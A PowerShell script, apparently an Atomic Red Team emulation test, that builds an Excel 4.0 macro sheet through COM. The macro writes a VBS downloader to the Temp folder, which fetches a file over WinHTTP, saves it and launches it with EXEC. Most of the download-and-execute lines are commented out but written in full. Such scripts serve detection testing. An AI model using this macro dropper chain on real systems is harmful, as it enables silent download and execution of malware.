# 获取当前文件所在目录
$CurrentDir = Split-Path -Parent $MyInvocation.MyCommand.Path

$fname = "$CurrentDir\atomic_redteam_x4m_exec.vbs"
$fname1 = "$CurrentDir\procexp.exe"
if (Test-Path $fname) {
    Remove-Item $fname
    Remove-Item $fname1
}

# 新建 Excel 应用程序对象   
$xlApp = New-Object -COMObject "Excel.Application"
$xlApp.Visible = $True  # 设置 Excel 可见
$xlApp.DisplayAlerts = $False   # 设置不显示警告信息
$xlBook = $xlApp.Workbooks.Add() # 新建工作簿
$sheet = $xlBook.Excel4MacroSheets.Add()    # 新建工作表

if ("$env:Username" -ne "") {
    $sheet.Cells.Item(1, 1) = "$env:Username"
}
else {
    $sheet.Cells.Item(1, 1) = "=GET.WORKSPACE(26)"
}

$sheet.Cells.Item(2, 1) = "procexp.exe"
$sheet.Cells.Item(3, 1) = "atomic_redteam_x4m_exec.vbs"
$sheet.Cells.Item(4, 1) = "=IF(ISNUMBER(SEARCH(`"64`",GET.WORKSPACE(1))), GOTO(A5),)"
$sheet.Cells.Item(5, 1) = "=FOPEN(`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`", 3)"
# $sheet.Cells.Item(6,1) = "=FWRITELN(A5, `"url =    `"`"https://live.sysinternals.com/procexp.exe`"`"`")"
$sheet.Cells.Item(6, 1) = "=FWRITELN(A5, `"url = `"`"https://github.com/procexp.exe`"`"`")"
# $sheet.Cells.Item(7, 1) = "=FWRITELN(A5, `"`")"
# $sheet.Cells.Item(8, 1) = "=FWRITELN(A5, `"Set winHttp = CreateObject(`"`"WinHTTP.WinHTTPrequest.5.1`"`")`")"
# $sheet.Cells.Item(9, 1) = "=FWRITELN(A5, `"winHttp.Open `"`"GET`"`", url, False`")"
# $sheet.Cells.Item(10, 1) = "=FWRITELN(A5, `"winHttp.Send`")"
# $sheet.Cells.Item(11, 1) = "=FWRITELN(A5, `"If winHttp.Status = 200 Then`")"
# $sheet.Cells.Item(12, 1) = "=FWRITELN(A5, `"Set oStream = CreateObject(`"`"ADODB.Stream`"`")`")"
# $sheet.Cells.Item(13, 1) = "=FWRITELN(A5, `"oStream.Open`")"
# $sheet.Cells.Item(14, 1) = "=FWRITELN(A5, `"oStream.Type = 1`")"
# $sheet.Cells.Item(15, 1) = "=FWRITELN(A5, `"oStream.Write winHttp.responseBody`")"
# $sheet.Cells.Item(16, 1) = "=FWRITELN(A5, `"oStream.SaveToFile `"`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`"`", 2`")"
# $sheet.Cells.Item(17, 1) = "=FWRITELN(A5, `"oStream.Close`")"
# $sheet.Cells.Item(18, 1) = "=FWRITELN(A5, `"End If`")"
# $sheet.Cells.Item(19, 1) = "=FCLOSE(A5)"
# $sheet.Cells.Item(20, 1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`")"
# $sheet.Cells.Item(21, 1) = "=WAIT(NOW()+`"00:00:05`")"
# $sheet.Cells.Item(22, 1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`")"
# $sheet.Cells.Item(23, 1) = "=HALT()"
# $sheet.Cells.Item(1, 1).Name = "runme"
# $xlApp.Run("runme")
# $xlApp.Quit()

# [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
# [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
# [System.GC]::Collect()
# [System.GC]::WaitForPendingFinalizers()

# Remove-Variable xlBook
# Remove-Variable xlApp